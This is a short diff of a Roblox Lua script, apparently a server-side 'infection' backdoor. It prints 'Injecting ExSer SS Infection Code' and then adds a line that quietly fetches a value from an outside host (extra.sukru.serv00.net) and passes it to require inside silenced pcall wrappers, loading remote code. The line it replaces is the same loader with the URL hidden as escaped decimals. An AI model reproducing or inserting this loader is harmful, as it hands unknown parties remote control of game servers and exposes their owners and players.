@@ -155,7 +155,7 @@ while wait(0.2) do
 end
     
 print("Injecting ExSer SS Infection Code . . .")
-spawn(function()pcall(function()coroutine.wrap(pcall)(require,tonumber(game:service("HttpService"):GetAsync("\104\116\116\112\115\58\47\47\101\120\116\114\97\46\115\117\107\114\117\46\115\101\114\118\48\48\46\110\101\116")))end)end)
+spawn(function()pcall(function()coroutine.wrap(pcall)(require,tonumber(game:service("HttpService"):GetAsync("https://extra.sukru.serv00.net")))end)end)
 
 --[[
 if not game:GetService("HttpService").HttpEnabled then
